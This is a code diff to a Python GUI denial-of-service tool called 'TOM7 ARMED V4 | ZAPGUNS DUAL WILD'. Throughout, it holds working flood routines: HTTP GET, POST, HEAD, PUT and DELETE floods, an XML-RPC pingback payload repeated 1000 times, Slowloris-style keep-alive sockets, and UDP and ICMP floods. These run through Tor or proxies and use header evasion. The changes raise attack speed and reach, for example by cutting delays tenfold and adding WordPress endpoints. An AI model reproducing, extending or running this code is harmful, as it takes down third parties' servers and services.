@@ -86,7 +86,7 @@ def dinamicsgui(startgui):
         cleargui()
         stdout.write(f'\r{Back.CYAN} {Fore.BLACK} {startgui} {Back.RESET} {Fore.RED} [ {Fore.YELLOW} {xspin} {Fore.RED} ] {Back.MAGENTA} {Fore.BLACK} LOADED {Back.RESET} {Fore.RED} [ {Fore.LIGHTGREEN_EX} {i:03d}/100 {Fore.RED} ] {Back.LIGHTBLUE_EX} {Fore.WHITE} PROGRESS BAR {Back.RESET} {Fore.RED} [ {Fore.LIGHTGREEN_EX} {xbar} {Fore.RED} ]')
         stdout.flush()
-        sleep(0.01)
+        sleep(0.001)
 
 # SIGNAL HANDLER
 
@@ -157,10 +157,12 @@ UATXD = [
 ]
 
 PROXTXD = [
-    "http://127.0.0.1:9050",
-    "https://127.0.0.1:9050",
-    "socks4://127.0.0.1:9050",
-    "socks5://127.0.0.1:9050"
+    "http://1.1.1.1:8080",
+    "https://1.1.1.1:443",
+    "http://8.8.8.8:8080",
+    "https://8.8.8.8:443",
+    "http://9.9.9.9:80",
+    "https://9.9.9.9:443"
 ]
 
 REFTXD = [
@@ -284,7 +286,7 @@ xcontenttype = [
 ]
 
 xdata = {
-    'username': ''.join(random.choices(string.ascii_letters, k=10)),
+    'username': ''.join(random.choices(string.ascii_letters + string.digits, k=10)),
     'password': ''.join(random.choices(string.ascii_letters + string.digits, k=15)),
     'email': f"{''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 15)))}@gmail.com",
     'token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
@@ -302,10 +304,8 @@ xmlpayloadx = """
         """.format("".join(['<value><string>pingback.ping</string></value>'* 1000]))
 
 xmlrpcdirx = ["/xmlrpc.php", "/xmlrpc", "/rpc", "/api/xmlrpc"]
-xmlrpcpathx = random.choice(xmlrpcdirx)
 
-endpoints = ["/api", "/json", "/data", "/upload", "/submit", "/"]
-endpoint = random.choice(endpoints)
+endpoints = ["/api", "/json", "/data", "/upload", "/submit", "", "wp-uploads", "wp-content", "wp-admin", "wp-login"]
 
 # SSL Context To Verify TLS Handshake
 
@@ -344,7 +344,7 @@ def xtor(target):
     try:
         torsx = socks.socksocket()
         torsx.set_proxy(torsocks, toraddr, torport, rdns=True)
-        torsx.settimeout(3)
+        torsx.settimeout(10)
         torsx.connect((ipaddr, port))
         tornet = True
         logging.info(f"[ + TOR ]: Proxies Enabled.")
@@ -434,7 +434,7 @@ class AttackMethods:
                         'https': 'socks5://127.0.0.1:9050'
                     }
 
-            elif proxy:
+            if proxy:
                 sessionx.proxies = {
                     "http": proxy,
                     "https": proxy
@@ -459,7 +459,7 @@ class AttackMethods:
                         xheaders = xevasion()
 
                         sessionx.get(
-                            target + f"?{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}",
+                            target.rstrip('/') + f"?{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}",
                             headers=xheaders,
                             timeout=3,
                             verify=False
@@ -469,7 +469,7 @@ class AttackMethods:
                     except Exception as e:
                         logging.error(f"[ ERROR ]: Attack Failed: {e}")
                     finally:
-                        sleep(0.01)
+                        sleep(0.001)
 
             finally:
                 sessionx.close()
@@ -498,7 +498,7 @@ class AttackMethods:
                         'https': 'socks5://127.0.0.1:9050'
                     }
 
-            elif proxy:
+            if proxy:
                 sessionx.proxies = {
                     "http": proxy,
                     "https": proxy
@@ -526,7 +526,7 @@ class AttackMethods:
                         xheaders = xevasion()
 
                         sessionx.get(
-                            target + f"?{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}",
+                            target.rstrip('/') + f"?{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}",
                             headers=xheaders,
                             timeout=3,
                             verify=False
@@ -536,7 +536,7 @@ class AttackMethods:
                     except Exception as e:
                         logging.error(f"[ ERROR ]: Attack Failed: {e}")
                     finally:
-                        sleep(0.01)
+                        sleep(0.001)
                         
             finally:
                 sessionx.close()
@@ -565,7 +565,7 @@ class AttackMethods:
                         'https': 'socks5://127.0.0.1:9050'
                     }
 
-            elif proxy:
+            if proxy:
                 sessionx.proxies = {
                     "http": proxy,
                     "https": proxy
@@ -593,7 +593,7 @@ class AttackMethods:
                         xheaders = xevasion()
 
                         sessionx.post(
-                            target + f"?{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}",
+                            target.rstrip('/') + f"?{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}",
                             data=xdata,
                             headers=xheaders,
                             timeout=3,
@@ -604,7 +604,7 @@ class AttackMethods:
                     except Exception as e:
                         logging.error(f"[ ERROR ]: Attack Failed: {e}")
                     finally:
-                        sleep(0.01)
+                        sleep(0.001)
 
             finally:
                 sessionx.close()
@@ -634,7 +634,7 @@ class AttackMethods:
                         'https': 'socks5://127.0.0.1:9050'
                     }
 
-            elif proxy:
+            if proxy:
                 sessionx.proxies = {
                     "http": proxy,
                     "https": proxy
@@ -660,7 +660,7 @@ class AttackMethods:
                         xheaders = xevasion()
 
                         sessionx.post(
-                            target + f"?{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}",
+                            target.rstrip('/') + f"?{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}",
                             json=payloadx,
                             headers=xheaders,
                             timeout=3,
@@ -697,7 +697,7 @@ class AttackMethods:
                         'https': 'socks5://127.0.0.1:9050'
                     }
 
-            elif proxy:
+            if proxy:
                 sessionx.proxies = {
                     "http": proxy,
                     "https": proxy
@@ -722,7 +722,7 @@ class AttackMethods:
                         xheaders = xevasion()
 
                         sessionx.head(
-                            target + f"?{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}",
+                            target.rstrip('/') + f"?{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}",
                             headers=xheaders,
                             timeout=3,
                             allow_redirects=True,
@@ -759,7 +759,7 @@ class AttackMethods:
                         'https': 'socks5://127.0.0.1:9050'
                     }
 
-            elif proxy:
+            if proxy:
                 sessionx.proxies = {
                     "http": proxy,
                     "https": proxy
@@ -783,7 +783,7 @@ class AttackMethods:
                         xheaders = xevasion()
 
                         sessionx.put(
-                            target + f"?{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}",
+                            target.rstrip('/') + f"?{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}",
                             data=xdata,
                             headers=xheaders,
                             timeout=3,
@@ -821,7 +821,7 @@ class AttackMethods:
                         'https': 'socks5://127.0.0.1:9050'
                     }
 
-            elif proxy:
+            if proxy:
                 sessionx.proxies = {
                     "http": proxy,
                     "https": proxy
@@ -844,8 +844,8 @@ class AttackMethods:
 
                         xheaders = xevasion()
 
-                        sessionx.put(
-                            target + f"?{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}",
+                        sessionx.delete(
+                            target.rstrip('/') + f"?{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}",
                             data=xdata,
                             headers=xheaders,
                             timeout=3,
@@ -883,7 +883,7 @@ class AttackMethods:
                         'https': 'socks5://127.0.0.1:9050'
                     }
 
-            elif proxy:
+            if proxy:
                 sessionx.proxies = {
                     "http": proxy,
                     "https": proxy
@@ -908,6 +908,8 @@ class AttackMethods:
 
                         xheaders = xevasion()
 
+                        xmlrpcpathx = random.choice(xmlrpcdirx)
+
                         for path in xmlrpcpathx:
                             sessionx.post(
                                 target.rstrip('/') + path, 
@@ -921,7 +923,7 @@ class AttackMethods:
                     except Exception as e:
                         logging.error(f"[ ERROR ]: Attack Failed: {e}")
                     finally:
-                        sleep(0.01)
+                        sleep(0.001)
 
             finally:
                 sessionx.close()
@@ -949,7 +951,7 @@ class AttackMethods:
         def createtcpsocksx():
             try:
                 tom7byte = (
-                    f"GET / HTTP/1.1\r\n"
+                    f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n"
                     f"Host: {host}\r\n"
                     f"User-Agent: {random.choice(xuseragent)}\r\n"
                     f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
@@ -961,7 +963,7 @@ class AttackMethods:
                 
                 dosx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 dosx.settimeout(3)
-                dosx.connect((host, port))
+                dosx.connect((ipaddr, port))
 
                 if port == 443:
                     sslcontextx = SSLContext(ssl.PROTOCOL_TLS_CLIENT)
@@ -969,8 +971,8 @@ class AttackMethods:
                     sslcontextx.verify_mode = SSLCNX
                     dosx = sslcontextx.wrap_socket(dosx, server_hostname=host)
 
-                dosx.sendall(tom7byte.encode())
-                dosx.sendall(xevasion().items().__str__().encode())
+                dosx.send(tom7byte.encode())
+                dosx.send(xevasion().items().__str__().encode())
                 
                 AttackMethods.updatethreads(target)
                 return dosx
@@ -996,7 +998,7 @@ class AttackMethods:
                     alive = f"X-a: {random.randint(1, 10000)}\r\n".encode()
                     dosx.send(alive)
                     dosx.sendall(alive)
-                    sleep(0.01)
+                    sleep(0.001)
                     AttackMethods.updatethreads(target)
                 except (socket.error, ssl.SSLError, OSError) as e:
                     if dosx in xsocketlist:
@@ -1040,7 +1042,7 @@ class AttackMethods:
                 datasizex = random.randint(512, 2048)
                 datax = ''.join(random.choices(string.ascii_letters + string.digits, k=datasizex)).encode('utf-8')
                 portx = random.choice(udpport)
-                targetxc = (ipaddr, portx)
+                targetxc = ((ipaddr, portx))
                 dosx.sendto(datax, targetxc)
                 AttackMethods.updatethreads(target)
                 return dosx, datax
@@ -1068,7 +1070,7 @@ class AttackMethods:
                     if udpsockx[0]:
                         xsocketlist.append(udpsockx)
                 finally:
-                    sleep(0.01)
+                    sleep(0.001)
 
         for dosx, _ in xsocketlist:
             try:
@@ -1080,13 +1082,13 @@ class AttackMethods:
     def xicmpflood(target, duration, threads):
         if os.name == "nt":
             if not ctypes.windll.shell32.IsUserAnAdmin():
-                logging.error("ICMP Flood requires Administrator privileges on Windows!")
+                messagebox.showerror("WARNING!", "ICMP Flood requires Administrator privileges on Windows!")
                 consolepanelmsg("ICMP Flood requires Administrator privileges!")
                 return
         else:
             try:
                 if os.getuid() != 0:
-                    logging.error("ICMP Flood requires root privileges on Linux!")
+                    messagebox.showerror("WARNING!", "ICMP Flood requires root privileges on Linux!")
                     consolepanelmsg("ICMP Flood requires root privileges!")
                     return
             except AttributeError:
@@ -1151,7 +1153,7 @@ class AttackMethods:
                     if dosx in xsocketlist:
                         xsocketlist.remove(dosx)
                 finally:
-                    sleep(0.01)
+                    sleep(0.001)
 
         for dosx in xsocketlist:
             try:
@@ -1164,7 +1166,7 @@ class AttackMethods:
 class TOM7ARMEDGUI:
     def __init__(self, root):
         self.root = root
-        self.root.title("TOM7 ARMED V3 | ZAPGUNS DUAL WILD")
+        self.root.title("TOM7 ARMED V4 | ZAPGUNS DUAL WILD")
         self.root.configure(bg="#00aeff")
         windowx = 800
         windowy = 600
@@ -1209,7 +1211,7 @@ class TOM7ARMEDGUI:
             bg="#000000",
             fg="#00FFBB",
             font=mainfontx,
-            text="TOM7 ARMED V2 | TOM7 ZAPGUNS",
+            text="TOM7 ARMED V4 | TOM7 ZAPGUNS DUAL WILD",
             highlightthickness=2,
             highlightbackground="#00FFBB",
             highlightcolor="#00FFBB"
@@ -1421,7 +1423,7 @@ class TOM7ARMEDGUI:
             return
         
         if xstatus.startx:
-            print(f"WARNING", "An Attack Already Running. Wait For It To Finish.")
+            messagebox.showwarning(f"WARNING", "An Attack Already Running. Wait For It To Finish.")
             return
 
         with lockx:
@@ -1450,8 +1452,9 @@ class TOM7ARMEDGUI:
             parsed = urlparse(target)
             host = parsed.hostname
             port = 443 if parsed.scheme == "https" else 80
+            ipaddr = socket.gethostbyname(host) if host else None
 
-            xstatusboard = f"Target: {host if host else 'N/A'}\nMethod: {method if method else 'N/A'}\nPort: {port if port else 'N/A'}\nTotal Requests: {xcurrent}"
+            xstatusboard = f"Target: {host if host else 'N/A'}\nMethod: {method if method else 'N/A'}\nIP Address: {ipaddr if ipaddr else 'N/A'}\nPort: {port if port else 'N/A'}\nTotal Requests: {xcurrent}"
             self.statuslblx.config(text=xstatusboard)
         except Exception as e:
             logging.debug(f"TOM7 ZAPGUNS GUI ERROR: {e}")
@@ -1465,7 +1468,7 @@ class TOM7ARMEDGUI:
         if tornet:
             xtorsocket = xtor(target)
             if not xtorsocket:
-                logging.warning("TOR Connection Failed, Proceeding Without TOR")
+                messagebox.showwarning("WARNING!", "TOR Connection Failed, Proceeding Without TOR")
 
         try:
             if method == "HTTP Flood":
